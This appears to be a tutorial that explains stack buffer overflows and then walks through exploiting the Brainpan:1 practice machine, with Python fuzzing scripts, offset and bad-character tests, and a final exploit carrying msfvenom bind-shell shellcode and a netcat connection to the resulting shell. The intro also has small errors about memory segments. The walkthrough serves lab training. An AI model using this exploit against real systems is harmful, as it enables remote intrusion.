# Buffer Overflow With an Example

This is a simple explanation of buffer overflow vulnerability. If you know how overflow works and only interested in solving brainpan CTF, please scroll down and move to the next section. 


To understand Buffer Overflow we need to uderstand the memory layout of a program. When we run a typical C program, it gets loaded into the memory (RAM) and gets divided into following five segments:

- **Text**: stores the executable code of the program.
- **Initialized data**: stores static/global variables. 
- **Uninitialized data(BSS)**: stores uninitialized static/global variables. 
- **Heap**: It is for dynamic memory allocation and can be managed using functions like malloc, calloc, realloc, free, etc.
- **Stack**: It is used for storing local variables defined inside functions, along with data related to function calls.

![Memory Layout](https://github.com/azizahsan/Buffer-Overflow/blob/master/layout.png?raw=true)

Note that Stack grows higher to lower address and heap grows opposite. 

Let's take an example of a simple C-program:

```
int x = 1000;
int main()
{
int var1=2;
static int var2;

int *ptr = (int*) malloc(2 * sizeof(int));

ptr[0]=5;
ptr[1]=6;

free(ptr);

return 1;
}
```

The above program will be arranged in memory as follows:

- Variable *x* (global variable) -> Initialized Data Segment (BSS)

- Local variables *var1* and *ptr*  -> Stack

- Variable *y* -> Uninialized Data Segment

- Values of *ptr[1]* and *ptr[2]* -> Heap

- Machine code of the compiled program -> Text Segment


The function *malloc(2 * sizeof(int))* allocates memory, of size two integers, on Heap, and variable *ptr* is a pointer which is pointing to that block of memory. The *ptr* would be stored on Stack and values *5* and *6* would go to Heap.

Buffer overflow can happen on both Heap and Stack, and the exploitation is differen for both. In this post, our focus is on stack overflow. 

When a function is called inside a program, some space is reserved for it on top of the stack. For instance the following code:


```
#include <string.h>

void foo(int a, int b)
{

int x = a+b;
int y = a*b;

}
int main()
{
  foo(8,9);
  printf("program finishing")
  return 1;
}

```

The function *foo()* would look like following in stack:

![function](https://github.com/azizahsan/Buffer-Overflow/blob/master/function.png?raw=true)
 
- **Parameters**: the arguments passed to the function will be pushed first in the stack.
- **Return Address**: when a funcion finishes, it returns back to the callee function and the address of next statement is called return address; in above example when *foo()* finishes it needs to return back to *main()* function, and run the statement right next to it, so the address of *printf* statement would be the return address. Please make sure you understand this as this is very important when we exploit buffer overflow.
- **Previous Frame pointer**: When a program is loaded to the memory, ESP (Extended Stack Pointer) points to the top of the stack, as stack grows from higher to lower address, the ESP would be pointing to the lowest address in stack. We can access other parts of stack with the offset of ESP, e.g. in above example, ESP would be pointing to the value of *y* and if value of *x* needed to be accessed we can add 4-bytes (in 32-bit architecture) in ESP and it would move to value of *x*. Now what if we call a function inside another function/porgram? the stack would grow to accomodate new function and ESP would also move to the top of the stack, and when we return from the function we would no longer be able to access the stack segments as we lost the previous value of ESP. To solve this problem, we have another register EBP (Extended Base Pointer), this register keeps the copy of ESP or just points to a fixed location in stack. So, ESP points to the top of the stack and it can move freely as required, and EBP points to a fixed location and other segments can be accessed with the offset of it. In this case, when we call another function, we can push the value of EBP into the stack of new function, so that when the function finishes we get back our base pointer. The "Previous Frame Pointer" in above example is basically value of EBP from *main* function. 
- **Local Variables**: next local variables are pushed to stack, the order of the variable is up to the compiler.


**A Vulnerable Program**

Following is a simple vulnerable program (taken from [this book](http://www.cis.syr.edu/~wedu/seed/Book/book_sample_buffer.pdf)):

```
#include <string.h>
void foo(char *str)
{
char buffer[12];
/* The following statement will result in buffer overflow */
strcpy(buffer, str);
}
int main()
{
char *str = "This is definitely longer than 12";
foo(str);
return 1;
}
```

The stack arrangement would be:

![stack](https://github.com/azizahsan/Buffer-Overflow/blob/master/stack.png?raw=true)

The stack grows from higher to lower address but the buffer grows normally i.e. lower to higher. The function *foo()* takes an argumnets and directly copies it to the buffer using function *strcpy()*, the buffer is declared as 12-bytes long, but in above program the string is longer than the buffer, so this string will overflow the buffer and overwrites other parts of stack, i.e. "Previous Frame Pointer", "Return Address" etc. As the return address is modified, the function would try to return to the new address and execute whatever is there, however if the new return address is out of the program allocated memory, the jump will fail and program will crash with a "segmentation fault" error. 

An adversary can take advantage of this scenario. If in a program like above, the string is actually a user input, an adversary can craft a string in such a way that he can control the return address, so that when the function returns, it actually returns on his injected code and executes it. Now how does an attacker inject code, and how does he know where is it on stack? most of the time he just enters input once which overflows the stack and jumps to his code; if the application is publically available, the attacker can try his code on it first before the real attack, otherwise, he has to guess things. In above example, if attacker knows that buffer size is 12-bytes, the next 4-bytes are "Previous Frame Pointer" and then 4-bytes for "Return Address", he can craft an input as follows:

```
"16-bytes random string" + "A random address on the stack" + "malicious code"
```

The first 16-bytes would fill up the stack until the return address, then attacker's return address followed by malicious code. Attacker is hoping that the return address will be the address of his malicious code, if it doesn' work then he will try another address. Attacker can improve the probability of guessing the return address by adding some "no operation" bytes before the malicious code, it depends how much space is available on the stack. The payload with "no operations"  would look like this: 

```
"16bytes random string" + "A random address on the stack" + "a lot of no operations bytes" + "malicious code"
```

Now attacker has to just jump one of the address on one of the no operatoin bytes and it will lead to his malicious code. 

I think that's enough of theory and hope you understand how the overflow works. We take a practical exmaple now. 


# Brainpan:1 Walkthrough

I am using a vulnerbale machine from vulnhub [Brainpan:1](https://www.vulnhub.com/entry/brainpan-1,51/), found it very good to practice buffer overflow. 

If you're using VirtualBox, just unzip the downloaded file and in virtual box *file->import appliance*, it would take a couple of minutes to load. Then go to settings of the VM and set network adapter as *Host-only*. Boot up Brainpan and also the your attacking machine (I am using Kali with Host-only adapter). My attacking machine got IP:192.168.56.101, the brainpan should also get the IP in same subnet, so try to ping .102, .103 or use netdiscover to find out; for me brainpan got IP:192.168.56.102. 

An nmap scan would give us two open ports:

```
nmap -p- -A 192.168.56.102
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-20 17:22 AEDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.102
Host is up (0.00046s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.70%I=7%D=2/20%Time=5C6CF250%P=i686-pc-linux-gnu%r(NULL
SF:,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\x
SF:20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x2
SF:0\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x20
SF:\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20
SF:\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20
SF:\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20
SF:_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20
SF:_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x20
SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\|
SF:\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x20
SF:_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x20
SF:_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x20
SF:THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20>>\x20");
MAC Address: 08:00:27:2A:0C:AE (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 192.168.56.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.92 seconds
```

Let's see what's at port 10000:

![website](https://github.com/azizahsan/Buffer-Overflow/blob/master/website.png?raw=true)

Dirb on port 10000:

```
dirb http://192.168.56.102:10000

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Feb 20 17:26:34 2019
URL_BASE: http://192.168.56.102:10000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.102:10000/ ----
+ http://192.168.56.102:10000/bin (CODE:301|SIZE:0)                                                                                  
+ http://192.168.56.102:10000/index.html (CODE:200|SIZE:215)                                                                         
                                                                                                                                     
-----------------
END_TIME: Wed Feb 20 17:26:48 2019
DOWNLOADED: 4612 - FOUND: 2
```

Let's see what's in the bin folder:

![bin](https://github.com/azizahsan/Buffer-Overflow/blob/master/bin.png?raw=true)

Port 9999 doesn't give anyting with browser, let's connect it with netcat:

![port](https://github.com/azizahsan/Buffer-Overflow/blob/master/port.png?raw=true)

It asks for password which we don't have at this stage. 

Let's download the brainpan.exe from /bin/ on port 10000 and analyse it. 

```
root@kali:~/Downloads# file brainpan.exe
brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
root@kali:~/Downloads# strings brainpan.exe
!This program cannot be run in DOS mode.
.text
`.data
.rdata
@.bss
.idata
[^_]
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
[^_]
[get_reply] s = [%s]
[get_reply] copied %d bytes to buffer
shitstorm
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|
[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              
                          >> 
                          ACCESS DENIED
                          ACCESS GRANTED
[+] initializing winsock...
[!] winsock init failed: %d
done.
[!] could not create socket: %d
[+] server socket created.
[!] bind failed: %d
[+] bind done on port %d
[+] waiting for connections.
[+] received connection.
[+] check is %d
[!] accept failed: %d
[+] cleaning up.
-LIBGCCW32-EH-3-SJLJ-GTHR-MINGW32
w32_sharedptr->size == sizeof(W32_EH_SHARED)
../../gcc-3.4.5/gcc/config/i386/w32-shared-ptr.c
GetAtomNameA (atom, s, sizeof(s)) != 0
AddAtomA
ExitProcess
FindAtomA
GetAtomNameA
SetUnhandledExceptionFilter
__getmainargs
__p__environ
__p__fmode
__set_app_type
_assert
_cexit
_iob
_onexit
_setmode
abort
atexit
free
malloc
memset
printf
signal
strcmp
strcpy
strlen
WSACleanup
WSAGetLastError
WSAStartup
accept
bind
closesocket
htons
listen
recv
send
socket
```

So this is 32-bit windows binary and have functions like strcpy/strcmp, so its possibally vulnerable to buffer overflow. I will be running this binary on Windows 7 virtual machine (you can download it from [here](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)), I also have installed [immunity debugger](https://www.immunityinc.com/products/debugger/) with [mona scripts](https://github.com/corelan/mona). 

When we run brainpan.exe it opens port 9999 on windows, and we can connect to it from our Kali. 

Let's run brainpan.exe and attach debugger to it (start immunity debugger and file->attach->brainpan.exe) and press start button. We can see the state of the registers and memory dump, we can right-click on any register and *follow-dump* to see where is it pointing to in the memory. 

![immunity](https://github.com/azizahsan/Buffer-Overflow/blob/master/immunity.png?raw=true)

My windows machine got IP:192.168.56.103. We can use following python code to fuzz the application. This code will send an input string (payload) to the application on port 9999. We can send some random pyaloads and see when the application crashes. A payload of size 1000 will crash it, the following code can be used to fuzz it, it is sending 1000 A's:

```
#!/usr/bin/python
import socket

string = "A" * 1000 
print "Fuzzing PASS with %s bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.56.103',9999))
s.recv(1024)	
s.send(string + '\r\n')
s.close()
```

We can see the error on our debugger. Let's have a look at the registers:

![registers](https://github.com/azizahsan/Buffer-Overflow/blob/master/registers.png?raw=true)

EIP (Extended Instruction Pointer) holds the address of the next instruction, it tells the computer where to go next to execute the next command and controls the flow of a program. In our case, when EIP reached to the return address, the application crashed as that address might be out of the program stack. For ASCII character "A" the hex value is 41 that's why our all memory is filled with 41s. So, we've modified the return address with our payload. Now we need to find out which part of our paylaod actually modified the return address, to do that we can generate a unique string and send it to the application and check the value of EIP. A module from metasploit can be used to generate a unique string:

```
root@kali:~/Downloads# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

```

Our code will become:
```
#!/usr/bin/python
import socket

string = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

print "Fuzzing PASS with %s bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.56.103',9999))
s.recv(1024)	
s.send(string + '\r\n')
s.close()
```

After the above payload the registers look like this:

![eip](https://github.com/azizahsan/Buffer-Overflow/blob/master/eip.png?raw=true)

EIP is 35724134, or in other words, the program tried to jump on it and failed. Let's see where exactly is this in our payload, we can use following command to do that:

```
root@kali:~/Downloads# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 35724134
[*] Exact match at offset 524

```
Nice. Our return address is at offset of 524 from the start of buffer. Let's confirm this using below code:

```
#!/usr/bin/python
import socket

string = "A" * 524 + "B" * 4 + "C" * (1000-524-4)  
print "Fuzzing PASS with %s bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.56.103',9999))
s.recv(1024)	
s.send(string + '\r\n')
s.close()
```

The first 524 bytes are "A", then 4 "B" and remaining part of the payload is "C", we are keeping the paylaod size same (1000). Let's see the registers after above paylaod:

![b](https://github.com/azizahsan/Buffer-Overflow/blob/master/b.png?raw=true)

Great, our EIP is filled with B's(42), we can control the EIP or return address. Now let's find out where we can put our malicious code on the stack. 

![current](https://github.com/azizahsan/Buffer-Overflow/blob/master/current.png?raw=true)

We can follow ESP in memory dump (right click on ESP address and click follow dump), and can see that ESP is actually pointing right next to the return address, which seems like a good location for our maclious code. 

Before we prepare our code, we need to find out if there are any characters which this application doesn't accept, e.g. many applications don't accept spaces in the payload. To find out we can send a list of all characters and see in the memory dump if application is escaping anything. 

```
#!/usr/bin/python
import socket

string = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" ) * 4

print "Fuzzing PASS with %s bytes" % len(string)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.56.103',9999))
s.recv(1024)	
s.send(string + '\r\n')
s.close()
```

I am using the character list four times so that it crashes the application and it's easy for us to find these characters in stack. Now if we match the payload characters with the stack ones, nothing is escaped actually. So we don't have to worry about any bad characters, we can only remove the null bytes (x00) from the payload. 

When an application rejects any character, the payload needs to be encoded, and the decoding would take place on the stack,  which needs some extra bytes, so having some no operations (typically 16-bytes) is a good practice, it will give some room for malicious code to get decoded, otherwise it may overflow to our return address.  

![bad](https://github.com/azizahsan/Buffer-Overflow/blob/master/bad.png?raw=true)


So our payload can look like follows:

```
524 bytes of random string + return address + some no operations + malcious code

```

As we can see in the memory dump that the address where ESP is pointing to is a good place to put our malicious code. We just need to jump to ESP to run our code, we cannot hardcode value of ESP as return address in our code as it gets changed after every execution, we need to find a statement which help us jump to ESP. 

It can be done by using mona modules in immunity debugger, first step is to see which process has [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) turned off, to do that we type "!mona modules" in debugger:

![aslr](https://github.com/azizahsan/Buffer-Overflow/blob/master/aslr.png?raw=true)

ASLR is false for brainpan.exe, we can find "JMP ESP" in brainpan.exe and use the address of that statement as our return address. The code for "JMP ESP" is (FFE4):

```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
nasm > jmp esp
00000000 FFE4 jmp esp
nasm > 
```

Let's search this using mona (note I am running mona commands after crashing the app):

![find](https://github.com/azizahsan/Buffer-Overflow/blob/master/find.png?raw=true)

We've got one "JMP ESP" address: 0x311712F3.

Now our payload would become:

```
524 bytes of random string + 0x311712F3 + 16 bytes of no operations + malicous code

```

I am adding 16-bytes of no operations as I am encoding the payload to avoid null bytes. The malicious code can be anything, I am using a bind shell, it will open port 4444 where we can connect. The msfvenom command for this is (-b is for bad character "\x00" and "x86/shikata_ga_nai" is the encoding we're using):

```
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f c -b "\x00" –e x86/shikata_ga_nai
```

Our final code would look like as follows:

```
#!/usr/bin/python
import socket

#return address = x311712f3
retaddr = "\xf3\x12\x17\x31"

shellcode = ("\xda\xc8\xba\x7e\x7a\xbe\x0e\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x53\x31\x56\x17\x83\xc6\x04\x03\x28\x69\x5c\xfb\x28\x65\x22"
"\x04\xd0\x76\x43\x8c\x35\x47\x43\xea\x3e\xf8\x73\x78\x12\xf5"
"\xf8\x2c\x86\x8e\x8d\xf8\xa9\x27\x3b\xdf\x84\xb8\x10\x23\x87"
"\x3a\x6b\x70\x67\x02\xa4\x85\x66\x43\xd9\x64\x3a\x1c\x95\xdb"
"\xaa\x29\xe3\xe7\x41\x61\xe5\x6f\xb6\x32\x04\x41\x69\x48\x5f"
"\x41\x88\x9d\xeb\xc8\x92\xc2\xd6\x83\x29\x30\xac\x15\xfb\x08"
"\x4d\xb9\xc2\xa4\xbc\xc3\x03\x02\x5f\xb6\x7d\x70\xe2\xc1\xba"
"\x0a\x38\x47\x58\xac\xcb\xff\x84\x4c\x1f\x99\x4f\x42\xd4\xed"
"\x17\x47\xeb\x22\x2c\x73\x60\xc5\xe2\xf5\x32\xe2\x26\x5d\xe0"
"\x8b\x7f\x3b\x47\xb3\x9f\xe4\x38\x11\xd4\x09\x2c\x28\xb7\x45"
"\x81\x01\x47\x96\x8d\x12\x34\xa4\x12\x89\xd2\x84\xdb\x17\x25"
"\xea\xf1\xe0\xb9\x15\xfa\x10\x90\xd1\xae\x40\x8a\xf0\xce\x0a"
"\x4a\xfc\x1a\xa6\x42\x5b\xf5\xd5\xaf\x1b\xa5\x59\x1f\xf4\xaf"
"\x55\x40\xe4\xcf\xbf\xe9\x8d\x2d\x40\x04\x12\xbb\xa6\x4c\xba"
"\xed\x71\xf8\x78\xca\x49\x9f\x83\x38\xe2\x37\xcb\x2a\x35\x38"
"\xcc\x78\x11\xae\x47\x6f\xa5\xcf\x57\xba\x8d\x98\xc0\x30\x5c"
"\xeb\x71\x44\x75\x9b\x12\xd7\x12\x5b\x5c\xc4\x8c\x0c\x09\x3a"
"\xc5\xd8\xa7\x65\x7f\xfe\x35\xf3\xb8\xba\xe1\xc0\x47\x43\x67"
"\x7c\x6c\x53\xb1\x7d\x28\x07\x6d\x28\xe6\xf1\xcb\x82\x48\xab"
"\x85\x79\x03\x3b\x53\xb2\x94\x3d\x5c\x9f\x62\xa1\xed\x76\x33"
"\xde\xc2\x1e\xb3\xa7\x3e\xbf\x3c\x72\xfb\xcf\x76\xde\xaa\x47"
"\xdf\x8b\xee\x05\xe0\x66\x2c\x30\x63\x82\xcd\xc7\x7b\xe7\xc8"
"\x8c\x3b\x14\xa1\x9d\xa9\x1a\x16\x9d\xfb")

string = "A"*524 + retaddr + "\x90"*16 + shellcode

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.56.103',9999))
s.recv(1024)
s.send(string + '\r\n')
s.close()
```

Note the syntax of return address. 

After running the above code, we can connect via netcat:

```
root@kali:~/Downloads# ./windows-poc.py
root@kali:~/Downloads# nc -nv 192.168.56.103 4444
(UNKNOWN) [192.168.56.103] 4444 (?) open
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\IEUser\Desktop>

```
As brainpan is linux, we need to generate shellcode for linux:

```
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00" –e x86/shikata_ga_nai
```

We just replace the shell code and run against the brainpan vm, and we'll be able to get shell. The poc for linux is also uploaded (linux-poc.py). 





